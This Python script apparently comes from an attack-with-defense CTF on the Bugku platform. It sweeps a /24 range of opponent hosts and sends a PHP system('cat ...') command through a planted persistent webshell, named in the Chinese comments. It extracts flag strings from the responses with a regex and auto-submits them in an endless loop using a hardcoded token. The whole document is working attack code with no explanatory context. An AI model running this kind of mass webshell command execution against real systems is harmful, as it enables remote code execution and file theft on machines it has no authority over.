import requests
import re

datas = {
    'c':"system('cat+/home/ctf/flag');"# 一句话木马,或者print_r(readfile(%27../../../../home/ctf/flag%27))
}

list = []
def shell():
    for i in range(1,255):
        try:
            io = requests.get("http://192-168-1-" + str(i) + ".awd.bugku.cn/Index.php?hihihi=ji45jm0uyta2ah2",data=datas)
            #上面不死马位置要改
            # list.append(io.text[0:38])
            list.append(re.search("flag{.*}", io.text).group(0)[:38])
        except:
            pass
    print(list)


while 1:
    shell()

    for i in list:
        io = requests.get("https://ctf.bugku.com/awd/submit.html?token=c2c1e4d002daa9eea931888935b0dd86&flag=" + str(i))
        # token 根据场景更改